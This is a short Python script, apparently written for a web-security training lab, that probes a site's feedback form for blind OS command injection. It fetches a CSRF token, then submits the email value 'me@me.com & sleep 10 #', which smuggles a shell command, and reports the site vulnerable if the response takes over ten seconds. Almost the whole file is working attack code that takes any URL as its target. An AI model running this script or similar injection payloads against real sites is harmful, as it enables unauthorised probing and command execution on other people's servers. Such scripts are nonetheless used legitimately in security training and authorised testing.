import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}



def get_csrf_token(s, url):
    feedback_path="feedback/"
    res=s.get(url=url+feedback_path, verify=False, proxies=proxies)
    soup=BeautifulSoup(res.text, 'html.parser')
    csrf=soup.find('input')['value']
    return csrf


def verify_vuln(s, url):
    csrf_token=get_csrf_token(s, url)
    submit_feedback_path="feedback/submit"
    email_injection="me@me.com & sleep 10 #"
    params={'csrf':csrf_token, 'name':'ali', 'email':email_injection, 'subject':'test', 'message':'testing email param'}
    res = s.post(url=url+submit_feedback_path, data=params, verify=False, proxies=proxies)

    if (res.elapsed.total_seconds() > 10):
        print("(+) Vulnerable to Time-based Command injection")
    else:
        print("(-) Not vulnerable to Time-based Command injection")



def main():
    if len(sys.argv)!=2:
        print("[+] Usage: %s URL" %sys.argv[0])
        print("[+] Example: %s http://www.example.com/" %sys.argv[0])
        sys.exit(-1)
    url=sys.argv[1]
    print("(+) Checkingn if email parameter is vulnerable to time-based Command Injection...")
    s = requests.session()
    verify_vuln(s, url)
    
if __name__ == "__main__":
    main()